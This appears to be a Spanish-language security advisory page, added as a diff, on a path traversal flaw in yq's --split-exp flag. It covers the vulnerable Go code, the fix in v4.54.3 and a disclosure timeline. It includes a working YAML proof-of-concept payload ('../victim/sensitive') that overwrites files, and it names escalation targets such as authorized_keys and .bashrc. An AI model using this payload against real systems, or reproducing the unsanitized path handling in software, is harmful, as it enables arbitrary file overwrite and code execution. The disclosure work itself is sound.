@@ -1,0 +1,106 @@
+---
+layout: reporte-es
+title: "GHSA-9fvq-9qj8-6qhx — Escritura arbitraria de archivos mediante path traversal en --split-exp de yq (mikefarah/yq)"
+description: "Path traversal en yq ≤4.54.1 mediante el flag --split-exp — nombres de archivo controlados por el documento llegan sin sanitizar a os.MkdirAll/os.Create, permitiendo escritura arbitraria fuera del directorio de trabajo. CVSS 7.3 HIGH. Corregido en v4.54.3."
+permalink: /reportes/GHSA-9fvq-9qj8-6qhx-es/
+permalink_en: /reports/GHSA-9fvq-9qj8-6qhx/
+---
+
+<h1>Escritura arbitraria de archivos mediante path traversal en <code>--split-exp</code></h1>
+
+<div class="meta-badges">
+  <span class="badge badge-tipo">Escritura Arbitraria</span>
+  <span class="badge badge-sev-high">CVSS 7.3 HIGH</span>
+  <span class="badge badge-cwe">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</span>
+  <span class="badge badge-id">mikefarah/yq ≤ v4.54.1 (--split-exp)</span>
+</div>
+
+<p>
+  <a href="https://github.com/mikefarah/yq/security/advisories/GHSA-9fvq-9qj8-6qhx">GHSA-9fvq-9qj8-6qhx</a> · Asignación de CVE pendiente
+</p>
+
+<h2>Resumen</h2>
+
+<p>El flag <code>--split-exp</code> (alias <code>-s</code>) evalúa una expresión yq contra el contenido del documento de entrada y usa el valor escalar resultante <strong>directamente como ruta de archivo de salida</strong> sin sanitización. Como no se rechazan componentes <code>..</code> ni rutas absolutas antes de que el valor llegue a <code>os.MkdirAll</code> y <code>os.Create</code>, un documento YAML/JSON/XML controlado por el atacante puede hacer que yq cree o sobrescriba archivos arbitrarios en cualquier lugar donde el proceso tenga permiso de escritura. Una víctima que ejecuta <code>yq -s '.name' payload-malo.yml</code> sobre entrada no confiable puede ver archivos fuera del directorio de trabajo sobrescritos silenciosamente — yq sale con código 0.</p>
+
+<h2>Impacto</h2>
+
+<ul>
+  <li><strong>Escritura arbitraria de archivos</strong> — crear/sobrescribir archivos con contenido controlado por el atacante (el propio documento procesado), más creación arbitraria de directorios.</li>
+  <li><strong>Vector de ataque:</strong> red — YAML no confiable procesado en CI/CD (charts, manifiestos de PRs, configs GitOps); sin autenticación.</li>
+  <li><strong>Escalación:</strong> sobrescribir dotfiles, scripts o definiciones de workflows (<code>~/.bashrc</code>, <code>~/.ssh/authorized_keys</code>, <code>.github/workflows/*.yml</code>, crontab) lleva a ejecución de código en la siguiente corrida; cualquier archivo escribible puede ser truncado o corrompido.</li>
+</ul>
+
+<h2>Causa Raíz</h2>
+
+<p>En <code>pkg/yqlib/printer_writer.go</code>, <code>multiPrintWriter.GetWriter</code> toma el nombre de archivo del propio documento y lo pasa al sistema de archivos sin sanitizar:</p>
+
+<pre><code class="language-go">// printer_writer.go:66-67 — name proviene del documento
+if result.MatchingNodes.Len() &gt; 0 {
+    name = result.MatchingNodes.Front().Value.(*CandidateNode).Value
+}
+
+// printer_writer.go:69-72 — solo un regex de extensión; sin validación de ruta
+var extensionRegexp = regexp.MustCompile(`\.[a-zA-Z0-9]+$`)
+if !extensionRegexp.MatchString(name) {
+    name = fmt.Sprintf("%v.%v", name, sp.extension)
+}
+
+// printer_writer.go:74-78 — el name sin sanitizar llega a los sumideros
+err = os.MkdirAll(filepath.Dir(name), 0750)
+...
+f, err := os.Create(name)
+</code></pre>
+
+<p>No hay verificación de <code>filepath.IsAbs</code>, ni rechazo de segmentos <code>..</code>, ni confinamiento a un directorio base. <code>--split-exp-file</code> comparte el mismo writer (solo cambia el origen de la expresión — <code>cmd/utils.go:57-64</code>); los flags se declaran en <code>cmd/root.go:199-205</code>.</p>
+
+<h2>Prueba de Concepto</h2>
+
+<p>Probado contra yq v4.54.1. Un archivo centinela fuera del directorio de trabajo es sobrescrito con el documento del atacante:</p>
+
+<pre><code class="language-bash"># Directorio de trabajo /tmp/yq-poc/work; archivo víctima fuera de él
+$ echo 'ORIGINAL SENSITIVE DATA - MUST NOT BE OVERWRITTEN' \
+    &gt; /tmp/yq-poc/victim/sensitive.yml
+
+# Payload controlado por el atacante: 'name' contiene la ruta de traversal
+$ cat &gt; /tmp/yq-poc/work/payload.yml &lt;&lt;'EOF'
+name: ../victim/sensitive
+message: attacker-controlled write
+EOF
+
+$ cd /tmp/yq-poc/work
+$ yq -s '.name' payload.yml
+[exit 0 — silencioso; el flag deriva los nombres de archivo del documento]
+
+$ cat /tmp/yq-poc/victim/sensitive.yml
+name: ../victim/sensitive
+message: attacker-controlled write          ← DATOS ORIGINALES ELIMINADOS
+</code></pre>
+
+<p>Variantes confirmadas: relativo un nivel (<code>../victim/…</code>), relativo dos niveles (escapa por completo el sandbox del PoC) y rutas absolutas (<code>name: /tmp/arbitrary/target</code> crea o sobrescribe en la ubicación literal). 3 capturas adjuntas al advisory.</p>
+
+<h2>Cronología de Divulgación</h2>
+
+<table>
+  <thead><tr><th>Fecha</th><th>Evento</th></tr></thead>
+  <tbody>
+    <tr><td>2026-10-09</td><td>Vulnerabilidad descubierta; PoC confirmado (variantes relativa, de dos niveles y ruta absoluta)</td></tr>
+    <tr><td>2026-10-23</td><td>Reportada vía GitHub Private Vulnerability Reporting como Issue A del advisory combinado; aceptada por el mantenedor el mismo día</td></tr>
+    <tr><td>2026-11-05</td><td>Issue A separado en el advisory independiente GHSA-9fvq-9qj8-6qhx</td></tr>
+    <tr><td>2026-11-09</td><td>Advisory publicado; corrección lanzada en yq v4.54.3</td></tr>
+    <tr><td>Pendiente</td><td>Asignación de CVE (solicitud debida ahora que existe corrección pública)</td></tr>
+  </tbody>
+</table>
+
+<h2>Corrección</h2>
+
+<p>yq v4.54.3 restringe las rutas de salida de split al directorio de trabajo por defecto:</p>
+
+<pre><code class="language-text">- Restricted `--split-exp` output paths to the current directory by default.
+  Use `--security-allow-write-any-path` with trusted input to restore the
+  previous behaviour (#2965)
+</code></pre>
+
+<p>El advisory también propone una defensa <code>sanitizeSplitFilename</code> que rechaza rutas absolutas y segmentos <code>..</code> después de <code>filepath.Clean</code> antes de cualquier llamada a <code>MkdirAll</code>/<code>Create</code>. Mitigación en versiones vulnerables: no pasar documentos no confiables a <code>--split-exp</code> / <code>--split-exp-file</code>.</p>
+
+<p><em>Corregido en yq v4.54.3 (2026-11-09). Advisory publicado 2026-11-09; asignación de CVE pendiente.</em></p>
